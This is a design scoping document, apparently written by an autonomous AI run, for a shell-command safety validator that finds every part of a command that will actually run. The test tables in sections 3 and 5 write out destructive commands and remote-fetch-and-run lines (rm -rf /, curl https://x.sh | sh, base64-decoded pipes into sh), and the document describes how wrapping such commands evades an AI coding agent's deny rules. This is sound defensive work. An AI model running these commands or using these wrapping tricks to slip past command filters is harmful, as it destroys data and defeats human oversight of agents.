# Scope — `caro.decompose.v1` (ADR-067)

**Date**: 2026-09-08 · **Produced by**: `caro-research--scoping-process` (autonomous run, no user present)
**Decision document**: `docs/adr/ADR-067-execution-site-decomposition.md`
**Baseline**: `caro` 1.4.0, tree as of `integrator/20260711-postmerge`

This document holds the implementation detail the ADR references. It commits no code.

---

## 1. One-paragraph statement

Three of the last five Claude Code releases patch the same seam — the gap between the text of a
shell command and the set of things that command will actually execute — once for zsh
`REPORTTIME=$(…)` assignments (v2.1.260), once for `rm -rf` inside a double-quoted `sh -c` script
and on positional parameters (v2.1.261), once for deny rules missing option-value and compound
operands (v2.1.259, reverted a day later for false positives). Each fix is a point patch because
the host's matcher has nowhere to state the general rule. Replaying Caro's own
`is_dangerous_in_context` against the same class of input shows Caro is further behind: eight of
thirteen dangerous commands come back clean, including `sh -c "rm -rf /"`. `caro decompose`
produces the missing artifact — one subprocess call, one serialized report, one exit code,
enumerating every region of the input that will be evaluated as a program, with the recovered text
of each and a typed `Opaque` classification where recovery is impossible from the input alone — and
the same PR rewrites `is_dangerous_in_context` to consume it, so the tool does not diagnose a bug
it still has.

---

## 2. New types

All in `src/models/mod.rs` unless noted, placed after `SuggestedRouting`. Every type derives at
minimum `Debug, Clone, PartialEq, Serialize, Deserialize, JsonSchema`. Enums are
`#[serde(rename_all = "snake_case")]` and `#[non_exhaustive]`.

Note for the implementer: `SuggestedRouting` currently derives `Serialize, Deserialize` but **not**
`JsonSchema` (`src/models/mod.rs:186`). `DecompositionReport` embeds it, so the PR adds `JsonSchema`
to that derive list. ADR-066's scope makes the identical one-word change; whichever lands first
makes it, the second rebases onto it. That is the only modification either scope makes to a type
that already ships.

### 2.1 Where a site sits in the input — the D1 accounting unit

```rust
/// Byte offsets into the ORIGINAL command string, never into a recovered substring.
/// Half-open: `start..end`. Always a valid char boundary.
pub struct Span {
    pub start: usize,
    pub end: usize,
}
```

Spans are what make D1 checkable. Every site carries one, they are the accounting unit for
`Coverage`, and they index the input the caller passed — not any intermediate — so a consumer can
highlight the site in the user's own text without re-deriving anything.

### 2.2 How a site comes to be executed

```rust
pub enum SiteKind {
    /// The outermost command list. Exactly one per report, always id 0.
    TopLevel,
    /// A member of a compound, split on `&&`, `||`, `;`, `|`, `|&`, `&`, newline.
    Segment { separator: Separator },
    /// Inside `$( … )` or backticks.
    Substitution,
    /// Inside `( … )` or `{ …; }`.
    Subshell,
    /// Body of a control-flow construct: `if`, `for`, `while`, `until`, `case`.
    ControlBody,
    /// The script operand of a head in the D3 interpreter set. THE case the host
    /// patches per-pattern and Caro currently suppresses outright.
    InterpreterArg { head: String },
    /// Right-hand side of an assignment the dialect evaluates. D4.
    AssignmentValue { name: String },
    /// `<( … )` / `>( … )`.
    ProcessSubstitution,
    /// A heredoc body fed to an interpreter head (`sh <<'EOF' … EOF`).
    HeredocScript { delimiter: String },
}

pub enum Separator { AndAnd, OrOr, Semi, Pipe, PipeAmp, Amp, Newline }
```

`InterpreterArg` carries the head verbatim (`"sh"`, `"eval"`, `"ssh"`) because a consumer's
policy will reasonably differ between `sh -c` and `ssh host` even though the site shape is
identical.

### 2.3 Whether the text could be read — D2, the fail-open negation

```rust
pub enum Recovery {
    /// The site's text is the input's own bytes at `span`, unquoted already.
    Verbatim,
    /// Recovered by removing quoting layers. `layers` is how many were stripped
    /// (1 for `sh -c "…"`, 2 for `sh -c "sh -c \"…\""`).
    Unquoted { layers: u8 },
    /// A program exists here at runtime and is NOT present in the input.
    /// `text` is `None`. NEVER validated, NEVER contributes a clean result.
    Opaque { reason: OpacityReason },
}

pub enum OpacityReason {
    /// What gets executed is determined by `$X` / `${X}` / `$(…)` in *program* position.
    VariableExpanded,
    /// `"$@"`, `"$*"`, `$1`. The v2.1.261 positional-parameter case.
    PositionalParameter,
    /// A decoder stands between the input and the interpreter:
    /// `base64 -d`, `xxd -r`, `openssl enc -d`, `gunzip`, `uudecode`.
    Encoded,
    /// The program is fetched: `curl`/`wget` output reaching an interpreter.
    RemoteFetch,
    /// The program is read from a file: `. f`, `source f`, `sh f`, `bash < f`.
    FileSourced,
    /// The interpreter name is itself expanded: `$SHELL -c "…"`, `$INTERP …`.
    DynamicInterpreter,
    /// Head takes a `-c`-shaped single string operand but is not in the D3 set.
    UnknownInterpreter { head: String },
    /// Depth cap (8) or site cap (256) reached. D5.
    NestingLimit,
    /// Unbalanced quote, or a dangling operator (`npm test &&`). The host's
    /// "unparseable, therefore not split" case, rendered as a site rather than silence.
    Unparsed,
    /// `ShellType::PowerShell` / `Cmd`. Caro declines to make a POSIX claim
    /// about a non-POSIX shell rather than making a wrong one.
    UnsupportedDialect,
}
```

`Opaque` is the whole point of the type. The host's matcher renders "I could not read this" as "no
rule matched", which is indistinguishable downstream from "clean". Here it is a required field on a
site that exists in the list, is counted in `coverage`, and forces the verdict.

### 2.4 The site

```rust
pub struct Site {
    /// Stable within a report: pre-order traversal, 0 is always TopLevel.
    pub id: u32,
    pub parent: Option<u32>,
    /// 0 for TopLevel. Capped at 8 (D5).
    pub depth: u8,
    pub kind: SiteKind,
    /// The dialect this site is evaluated under, which need not be the report's
    /// shell: an `sh -c` site inside a Zsh command is `ShellType::Sh`.
    pub dialect: ShellType,
    pub span: Span,
    pub recovery: Recovery,
    /// `Some` iff `recovery != Opaque`. Never an empty string.
    pub text: Option<String>,
    /// `Some` iff `text.is_some()`.
    pub validation: Option<SiteValidation>,
}
```

### 2.5 What the existing validator said about this site

```rust
/// A projection of `ValidationResult`, not a replacement. Produced by calling
/// `SafetyValidator::validate_command(site.text, site.dialect)` — the report
/// re-uses the validator and does not re-implement matching.
pub struct SiteValidation {
    pub risk_level: RiskLevel,
    pub matched_patterns: Vec<String>,
    pub allowed: bool,
}
```

Deliberately narrower than `ValidationResult`: no `confidence_score` (meaningless per site), no
`explanation` (the report's consumer composes its own from `matched_patterns` and the site kind),
no `warnings` (they are `matched_patterns` restated). Widening later is additive.

### 2.6 The D1 invariant, serialized

```rust
pub struct Coverage {
    pub input_bytes: usize,
    /// Bytes covered by some site's span, or by a span classified as non-executable
    /// data (operands, flags, redirect targets, quoted args under a non-interpreter head).
    pub attributed_bytes: usize,
    /// Spans the scanner could not attribute either way. MUST be empty for a
    /// `Clear` verdict. Non-empty means the scanner has a bug, and the report
    /// says so instead of hiding it.
    pub unattributed: Vec<Span>,
}
```

This is the structural answer to the current filter. `is_dangerous_in_context` works by *dropping*
text; nothing anywhere records that a drop happened, which is why eight false negatives sat in a
shipped release behind a doc comment calling its own limitations "rare in practice". Under
`Coverage`, dropping is representable only as a number that does not add up, and a number that does
not add up downgrades the verdict.

### 2.7 Verdict and report

```rust
pub enum DecompositionVerdict {
    /// Every site recovered, none at or above the blocking threshold.
    Clear,
    /// At least one recovered site matched at or above the threshold.
    Finding { max_risk: RiskLevel, site_ids: Vec<u32> },
    /// No finding, but at least one site is `Opaque`.
    Opaque { site_ids: Vec<u32> },
    /// The input could not be scanned at all (unbalanced quote at depth 0).
    /// `sites` holds exactly one `TopLevel` site with `Opaque { Unparsed }`.
    Unparsed,
}

pub struct DecompositionReport {
    /// Literal `"caro.decompose.v1"`. Always serialized, never defaulted.
    pub schema: String,
    pub command: String,
    /// The dialect the caller declared or Caro detected, for the TOP level.
    pub shell: ShellType,
    pub safety_level: SafetyLevel,
    pub depth_limit: u8,
    pub site_limit: u32,
    /// Pre-order. Never empty — a report always has at least a TopLevel site.
    pub sites: Vec<Site>,
    pub coverage: Coverage,
    pub verdict: DecompositionVerdict,
    /// Max `risk_level` across recovered sites. `Safe` if none.
    pub risk_level: RiskLevel,
    pub routing: SuggestedRouting,
    /// True iff a cap in D5 was hit.
    pub truncated: bool,
}
```

### 2.8 Method contracts

```rust
// src/safety/decompose.rs

pub struct Limits { pub depth: u8, pub sites: u32 }
impl Default for Limits { /* depth: 8, sites: 256 */ }

/// The D6 shared primitive. Pure, total, no I/O, no panics on any `&str`.
/// Returns sites in pre-order. On an unbalanced quote at depth 0 returns a
/// one-element vec (TopLevel / Opaque{Unparsed}) rather than an `Err` —
/// there is no input for which this function has no answer.
pub fn sites(command: &str, shell: ShellType, limits: Limits) -> Vec<Site>;

/// Runs `sites`, validates each recovered site through the caller's validator,
/// computes coverage, verdict, risk and routing.
pub async fn report(
    command: &str,
    shell: ShellType,
    validator: &SafetyValidator,
    safety: SafetyLevel,
    limits: Limits,
) -> DecompositionReport;

/// The D7 consumer. Returns the recovered program text of every site, in
/// pre-order, for regex matching. Sync, allocation-light, no validator needed.
pub(crate) fn executable_texts(command: &str, shell: ShellType) -> Vec<&str>;
```

`sites()` is total by construction: every branch that cannot proceed emits an `Opaque` site rather
than returning an error, which is D2 expressed in the signature.

---

## 3. Semantics

### 3.1 The interpreter set — D3

A quoted or unquoted operand becomes an `InterpreterArg` site **only** when the segment's head is in
this table. Everything else is data.

| Head form | Site operand | Notes |
|---|---|---|
| `sh -c S`, `bash -c S`, `zsh -c S`, `dash -c S`, `ksh -c S` | `S` | dialect of the child site follows the head, not the report |
| `bash -lc S`, `sh -ec S`, any flag cluster containing `c` | `S` | flag clusters are scanned, not string-compared |
| `eval S…` | all operands, joined by a space | `eval` concatenates |
| `su -c S [user]`, `su user -c S` | `S` | |
| `sudo …` | recurse on the tail | `sudo sh -c S` is `sudo` → `sh -c` → site |
| `env [K=V…] CMD…`, `nohup CMD…`, `timeout N CMD…`, `nice … CMD…`, `stdbuf … CMD…`, `setsid CMD…` | recurse on the tail | wrapper strip, shared with ADR-066's set |
| `ssh [opts] host S…` | `S…` joined | dialect `Unknown` — the remote shell is not knowable |
| `xargs [opts] CMD…` | recurse on `CMD…` | `xargs sh -c S` reaches the site |
| `find … -exec CMD… ;`/`+`, `-execdir` | recurse on `CMD…` | terminator consumed, not part of the site |
| `docker run … IMG CMD…`, `docker exec … CTR CMD…`, `podman …` | recurse on `CMD…` | |
| `kubectl exec … -- CMD…` | recurse after `--` | |
| `awk … 'system(S)'`, `perl -e S`, `python -c S`, `ruby -e S`, `node -e S` | `S`, dialect `Unknown` | recovered, but validated only against dialect-agnostic patterns |
| head is `$VAR`-expanded, or ends in `-c` with one string operand but is not above | — | `Opaque { DynamicInterpreter }` / `Opaque { UnknownInterpreter }` |

Two rules keep this from becoming the reverted v2.1.259 change:

1. The trigger is the **head**, never the shape of the argument. `npm run build` has a
   non-interpreter head, so nothing about its arguments is scanned, which is exactly the case that
   forced the host's revert.
2. `echo 'rm -rf /' > script.sh` keeps its current answer for a better reason than today's: `echo`
   is not in the table, so its operand is data. The quote count is irrelevant.

### 3.2 Dialect-conditional assignment sites — D4

| Dialect | Assignment names yielding `AssignmentValue` |
|---|---|
| `Zsh` | `REPORTTIME`, `REPORTMEMORY`, `DIRSTACKSIZE`, `SAVEHIST`, `HISTSIZE`, `LISTMAX`, `KEYTIMEOUT`, `TMOUT` — zsh's integer coercion evaluates a `$(…)` RHS |
| `Bash`, `Sh`, `Ksh`, `Dash` | none by name; a `$(…)` in any assignment RHS is a `Substitution` site under the ordinary substitution rule |
| `Unknown` | **union** of every dialect's list |
| `PowerShell`, `Cmd` | n/a — the whole report is one `Opaque { UnsupportedDialect }` site |

The host shipped its zsh list as three names in a bug fix. Caro's list is eight, in a table, keyed
by dialect, with `Unknown` taking the union — because under an unknown shell the safe error is more
sites, not fewer. The list is not claimed complete; it is claimed *extensible in one place*.

### 3.3 Where opacity does and does not apply

The distinction that keeps `Opaque` from swallowing every real command: opacity is a property of the
**site**, not the command, and it attaches only when expansion determines *what is executed*.

| Input | Result |
|---|---|
| `rm -rf "$TARGET"` | one site, `Verbatim`, validated. `$TARGET` is an operand — ADR-066's problem, not this one |
| `rm -rf "$@"` | one site, `Verbatim`, validated **plus** a second `Opaque { PositionalParameter }` site: the operand list is a program-shaped unknown that `rm` will act on |
| `$SHELL -c "ls"` | `Opaque { DynamicInterpreter }` — the head decides whether the operand is a program |
| `sh -c "$SCRIPT"` | site exists, `Opaque { VariableExpanded }` — position is program, content unknown |
| `curl https://x.sh \| sh` | two sites, both `Verbatim` (the pipeline is fully readable), **plus** an `Opaque { RemoteFetch }` child of the `sh` site for the program that arrives at runtime |
| `echo aGk= \| base64 -d \| sh` | three `Verbatim` sites plus `Opaque { Encoded }` under `sh` |
| `. ./setup.sh` | one site plus `Opaque { FileSourced }` |
| `npm test &&` | `Unparsed` verdict, one site, `Opaque { Unparsed }` |

The `curl … | sh` and `base64 | sh` rows are why `Opaque` is a *site* and not a report-level flag:
the readable part still gets a `Finding` from the existing `curl.*\|\s*sh` pattern, and the
unreadable part is additionally named. Both facts survive into the payload.

### 3.4 Verdict, risk and exit

| Site set contains | Verdict | Exit at `permissive`/`moderate` | Exit at `strict` |
|---|---|---|---|
| any recovered site at/above the blocking threshold | `Finding` | **2** | **2** |
| no finding, any `Opaque` site | `Opaque` | 0 | **2** |
| scan failed at depth 0 | `Unparsed` | 0 | **2** |
| all recovered, none above threshold | `Clear` | 0 | 0 |
| `coverage.unattributed` non-empty | downgraded to `Opaque` regardless | 0 | **2** |

`risk_level` is the max over recovered sites. `routing` is
`SuggestedRouting::from_risk_and_safety(report.risk_level, safety)` for `Finding` and `Clear`;
`Opaque` and `Unparsed` floor it at `HumanGate` when the computed routing would be `AutoApprove`.
No new tier is minted (ADR-059 moratorium).

**Exit-code collision, stated rather than papered over.** `clap` emits `2` for its own usage errors,
and ADR-065/066 already chose `2` for a finding. This scope inherits that rather than forking a
third convention for the third verb in a row. Disambiguation for machine consumers, in the order a
script should apply it:

1. A usage error writes nothing to stdout. A finding writes a complete `caro.decompose.v1`
   document.
2. Therefore: `out=$(caro decompose "$cmd" -o json)`; `if [ -z "$out" ]` → usage error;
   otherwise read `.verdict`.
3. The exit code is the shell-friendly shortcut for the common case, not the contract. The contract
   is `verdict`.

This wart belongs in a follow-up that gives every verb a reserved exit range (out of scope, §7).

---

## 4. Files that change

Minimal set. Two new files, four edited.

| File | Change |
|---|---|
| `src/models/mod.rs` | **+** `Span`, `Separator`, `SiteKind`, `OpacityReason`, `Recovery`, `Site`, `SiteValidation`, `Coverage`, `DecompositionVerdict`, `DecompositionReport`. **~** add `JsonSchema` to `SuggestedRouting`'s derive list (`:186`) |
| `src/safety/decompose.rs` | **new.** The quote/nesting state machine, the §3.1 interpreter table, the §3.2 dialect table, `Limits`, `sites()`, `report()`, `executable_texts()` |
| `src/safety/mod.rs` | **~** `pub mod decompose;`. **~** `is_dangerous_in_context` (`:426-452`) rewritten per D7 — the quote counter deleted, replaced by a loop over `executable_texts()`. **~** the allowlist loop (`:496-511`) matches per site instead of against the raw string |
| `src/main.rs` | **+** `Commands::Decompose { command: String, shell: Option<String>, safety: Option<String>, depth: Option<u8>, output: Option<String> }`; **+** dispatch arm; **+** `pub const EXIT_CODE_DECOMPOSITION_FINDING: i32 = 2;` beside `EXIT_CODE_EDIT` (`:938`) |
| `src/cli/mod.rs` | **+** `pub decomposition: Option<DecompositionReport>` on `CliResult`, `#[serde(default, skip_serializing_if = "Option::is_none")]` |
| `tests/decomposition_contract.rs` | **new.** §5 |

No new top-level module. No new crate — the scanner is `str` indexing and a `Vec` stack; no
`shell-words`, no `conch-parser`, no `regex` beyond what `SafetyValidator` already compiles. No new
feature flag. No new config key: `--depth` is a CLI flag and stays one in v1 (a
`SafetySection.decompose_depth` key is §7).

Two traps carried forward from the ADR-066 survey and re-verified on this tree:

- `Cli` is declared `#[command(args_conflicts_with_subcommands = true)]` (`src/main.rs:690`), so the
  global `--safety`/`--shell` flags are unusable alongside a subcommand. `Commands::Decompose`
  declares its own, following `Commands::Run`.
- There is no `--json` flag anywhere in caro. JSON is `-o json` via `OutputFormat::from_str`
  (`src/cli/mod.rs:105`).

---

## 5. Integration tests

`tests/decomposition_contract.rs`, using `assert_cmd`. Each row runs
`caro decompose <input> --shell <sh> -o json` and asserts the **full** `verdict` sub-document, the
**complete** `sites` array (ids, kinds, spans, recovery, text), and the exit code — not field
presence, which is the weakness `tests/e2e_cli_tests.rs::e2e_json_output_format` has and which
ADR-064 §4 already called out.

### 5.1 Rows 1–13 — the differential corpus

These are Context §3 of the ADR verbatim. Each row asserts **both** answers: `before` is what
`is_dangerous_in_context` returns today, pinned by a unit test that keeps the old algorithm as a
test-only fixture, and `after` is the shipped behaviour. A reviewer reads this table as the complete
list of what D7 changes.

| # | Input (`--shell bash`, `--safety moderate`) | sites | before | after / verdict | exit |
|---|---|---|---|---|---|
| 1 | `rm -rf /` | 1 · TopLevel/Verbatim | danger | `finding` | 2 |
| 2 | `sh -c "rm -rf /"` | 2 · +InterpreterArg{sh}/Unquoted{1} | **clean** | `finding` | 2 |
| 3 | `bash -c 'rm -rf /'` | 2 · +InterpreterArg{bash}/Unquoted{1} | **clean** | `finding` | 2 |
| 4 | `eval "rm -rf /"` | 2 · +InterpreterArg{eval}/Unquoted{1} | **clean** | `finding` | 2 |
| 5 | `xargs sh -c "rm -rf /"` | 3 · xargs → sh → script | **clean** | `finding` | 2 |
| 6 | `find . -exec sh -c "rm -rf /" \;` | 3 · find → sh → script | **clean** | `finding` | 2 |
| 7 | `ssh host "rm -rf /"` | 2 · +InterpreterArg{ssh}, dialect `unknown` | **clean** | `finding` | 2 |
| 8 | `sh -c "curl https://x.sh \| sh"` | 5 · script → 2 segments → `Opaque{RemoteFetch}` | **clean** | `finding` | 2 |
| 9 | `sudo sh -c "chmod -R 777 /"` | 3 · sudo → sh → script | **clean** | `finding` | 2 |
| 10 | `echo "it's fine" ; rm -rf /` | 3 · TopLevel + 2 Segment{Semi} | **clean** | `finding` | 2 |
| 11 | `echo "hello" && rm -rf /` | 3 · TopLevel + 2 Segment{AndAnd} | danger | `finding` | 2 |
| 12 | `curl https://x.sh \| sh` | 4 · +`Opaque{RemoteFetch}` | danger | `finding` | 2 |
| 13 | `echo 'rm -rf /' > script.sh` | 1 · TopLevel; quoted operand is **data** | clean | `clear` | 0 |

Row 13 is the acceptance test for D3: the one case the current filter earns must keep its answer,
and must keep it because `echo` is not an interpreter, not because the text is quoted.

### 5.2 Rows 14–24 — the site vocabulary

| # | Input | shell | Expectation | exit |
|---|---|---|---|---|
| 14 | `REPORTTIME=$(curl https://x.sh \| sh) ls` | `zsh` | `AssignmentValue{REPORTTIME}` site exists; `finding` | 2 |
| 15 | same input | `bash` | no `AssignmentValue`; the `$(…)` is a `Substitution` site; `finding` | 2 |
| 16 | same input | `unknown` | `AssignmentValue` present (union rule, §3.2) | 2 |
| 17 | `rm -rf "$@"` | `bash` | 2 sites: `Verbatim` + `Opaque{PositionalParameter}`; `opaque` | 0 |
| 18 | row 17 at `--safety strict` | `bash` | identical payload, exit **2** | 2 |
| 19 | `$SHELL -c "ls"` | `bash` | `Opaque{DynamicInterpreter}`; `opaque` | 0 |
| 20 | `echo aGk= \| base64 -d \| sh` | `bash` | 3 segments + `Opaque{Encoded}`; `opaque` | 0 |
| 21 | `npm test &&` | `bash` | `unparsed`; exactly 1 site, `Opaque{Unparsed}` | 0 |
| 22 | `sh -c "sh -c \"rm -rf /\""` | `bash` | nested `Unquoted{2}`; `finding`; `depth` 2 | 2 |
| 23 | `sh -c "$(printf 'sh -c ')..."` nested to 12 | `bash` | `truncated: true`, `Opaque{NestingLimit}` at depth 8 | 0 |
| 24 | `Remove-Item -Recurse C:\` | `powershell` | 1 site, `Opaque{UnsupportedDialect}`; `opaque` | 0 |
| 25 | `git commit -m "fix: rm -rf / in docs"` | `bash` | `clear` — commit message is data under a non-interpreter head | 0 |

Row 25 is the false-positive canary. It is the shape of the change the host reverted in v2.1.260,
and it must stay clean.

### 5.3 Invariant tests

- **Coverage property test** (`proptest`, seeded, in `tests/property_tests.rs`): for arbitrary
  inputs up to 4 KiB over a shell-ish alphabet, `coverage.unattributed.is_empty() || verdict !=
  Clear` — the D1 invariant, asserted directly.
- **Totality**: `sites()` never panics and always returns a non-empty vec, over the same generated
  corpus plus a fixture file of malformed inputs (lone quotes, NUL-adjacent bytes, 4-byte UTF-8
  split across a quote boundary, 10 KiB of `$(`).
- **Span validity**: every `span` is a char boundary, `start < end`, and `span ⊆ 0..input.len()`.
- **Determinism**: the same input produces byte-identical JSON across 100 runs and across
  `--depth` values that do not truncate.
- **Regression gate** (D7): `tests/cve_enforcement.rs`, `tests/beta_regression.rs`,
  `tests/custom_patterns_toml.rs`, `tests/property_tests.rs` pass **unchanged**. Any edit to those
  four files is a review stop.
- **Latency** (`benches/`): p99 < 1 ms for a 4 KiB command, keeping the verb inside ADR-062's hook
  budget.

---

## 6. Rollout and fallback

One PR on a feature branch per `.claude/rules/git-workflow.md`, conventional-commit
`feat(safety): execution-site decomposition + per-site validation (ADR-067)`.

Order of commits inside the PR, so the diff reads in the right order:

1. `feat(models)` — the types, with schema round-trip unit tests. No behaviour.
2. `feat(safety)` — `decompose.rs` and `sites()`, with the §5.2 vocabulary tests. Still no
   behaviour change to anything shipped.
3. `feat(cli)` — the verb, dispatch, exit code, `tests/decomposition_contract.rs` §5.1 rows
   asserting only the `after` column. Additive.
4. `fix(safety)` — the D7 rewrite of `is_dangerous_in_context` and the allowlist loop, with the
   `before`/`after` differential fixture. **This is the only commit that changes shipped
   behaviour**, and it is reviewable on its own.

**Fallback.** Reverting commit 4 alone restores the current validator exactly and leaves the verb
in place as advisory — the ADR-067 Alternative 4 position, available as a rollback rather than
chosen as a design. Reverting the whole PR is a six-file revert; there is no persisted state, no
config key and no migration.

**Validation-discipline note** (`.claude/rules/validation-discipline.md`). This is a new
user-facing capability, so the five gates apply to the *verb*. They do not apply to commit 4: a
false-negative fix in existing safety validation is "a response to evidence we already have (broken
thing)", which the rule excludes by name. Gate 3's "what breaks at 100 real users" is answered
in-scope: the scanner is single-user, single-process, stateless and allocation-bounded by
`Limits`, so there is no shared-state assumption to break; the instrumentation is
`coverage.unattributed` and `truncated`, both already in the payload; the fallback is
`--depth`/`--safety permissive`. Gates 1, 2, 4 and 5 attach to the verb's own spec PR and are
tracked as a blocking child bead, not waived here.

---

## 7. Explicitly out of scope

Belongs to the next version, not this one:

1. **Expansion.** No `$VAR` substitution, no `~` expansion, no globbing, no word splitting, no
   alias or function resolution. `Recovery` is the seam that admits a future `Expanded` variant
   without a schema break, and if it ever lands it must be distinguishable in the payload from
   `Verbatim` — the whole lesson of the `Opaque`/absence distinction is that two different claims
   must not share a representation.
2. **A real grammar.** ADR-007's AST. When it lands, `decompose` becomes a projection of it;
   `sites()`'s signature is chosen so that the swap is internal.
3. **Fixing the exit-code convention.** Three verbs now use `2` for a finding and collide with
   `clap`'s usage exit. The fix is a reserved per-verb range across ADR-065/066/067 in one PR, not
   a fourth unilateral choice here.
4. **Non-POSIX dialects.** PowerShell and Cmd get `Opaque { UnsupportedDialect }`. A real
   PowerShell site model is its own ADR with its own interpreter table
   (`Invoke-Expression`, `iex`, `Start-Process`, `-EncodedCommand`).
5. **Per-site policy.** Allowing a consumer to express "deny `InterpreterArg` sites entirely" or
   "`ssh` sites are always `HumanGate`" is policy vocabulary, which the ADR-059 moratorium closes
   until `caro.assessment.v1` merges. v1 emits the facts; policy over them is 058/059's job.
6. **Feeding the site list into generation.** The backends still see the flat command. Using
   decomposition to *prompt* a model ("this command has a hidden `sh -c`, regenerate without it")
   is an agent-loop feature, not a validator feature.
7. **`SafetySection.decompose_depth` config key.** `--depth` is a flag in v1. A config key means a
   precedence story with `patterns.toml` and the profile system, which is more surface than the
   feature needs on day one.
8. **Heredoc content analysis beyond interpreter heads.** `cat <<EOF` bodies stay data. Only
   `sh <<EOF` and its table-listed siblings produce a `HeredocScript` site.

---

## 8. Open questions for the human reviewer

Flagged rather than decided, because an autonomous run should not settle them alone:

1. **Is commit 4 in this PR or its own?** The ADR argues for one PR (D7); a reviewer who wants the
   verb landed fast can split it, at the cost of shipping a diagnostic for a live bug. The commit
   ordering in §6 makes either choice a one-command split.
2. **Does the false-negative finding warrant a security advisory?** Eight wrapped forms of
   `Critical` patterns are not detected in 1.4.0 GA, including the ones the critical-built-in
   pre-scan claims are undefeatable by allowlist. That is arguably a `SECURITY.md` disclosure and a
   patch release, not a feature PR. This run did not file one.
3. **`ssh host "…"` — site or not?** Row 7 treats it as an interpreter site with dialect `Unknown`.
   The counter-argument is that the danger executes on another machine and a local safety verdict
   overstates the claim. A `Locality` field on `Site` would answer it properly and is not in v1.
